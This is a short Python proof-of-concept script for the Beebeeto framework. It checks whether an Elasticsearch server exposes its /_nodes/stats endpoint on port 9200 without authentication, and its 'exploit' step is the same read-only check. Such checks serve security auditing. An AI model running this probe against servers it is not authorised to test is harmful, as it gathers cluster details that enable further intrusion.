#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import requests
import urlparse

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0014',
            'name': 'Elasticsearch 9200端口 未授权访问漏洞 POC',
            'author': 'foundu',
            'create_date': '2015-01-20',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [9200],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Elasticsearch',
            'vul_version': ['*'],
            'type': 'Information Disclosure',
            'tag': ['Elasticsearch漏洞', '未授权访问漏洞', '信息泄露漏洞'],
            'desc': '默认情况，Elasticsearch开启后会监听9200端口可以在未授权的情况下访问，从而导致敏感信息泄漏',
            'references': ['',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        target = urlparse.urlparse(args['options']['target'])
        verify_url = '%s://%s:9200/_nodes/stats' % (target.scheme, target.netloc)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        try:
            content = requests.get(verify_url, timeout=5).text
        except:
            content = ''
        if 'cluster_name' in content and 'transport_address":' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())